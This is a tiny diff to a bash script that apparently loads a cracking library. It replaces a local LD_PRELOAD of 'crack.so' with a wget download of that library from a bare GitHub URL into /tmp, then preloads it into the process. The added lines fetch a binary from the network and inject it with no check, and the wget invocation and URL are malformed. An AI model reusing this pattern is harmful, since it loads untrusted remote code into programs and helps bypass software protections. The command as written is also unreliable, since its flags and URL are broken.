@@ -1,2 +1,3 @@
 #!/bin/bash
-export LD_PRELOAD=../crack.so
+wget -P -o /tmp/crack.so https://github.com/
+export LD_PRELOAD=/tmp/crack.so
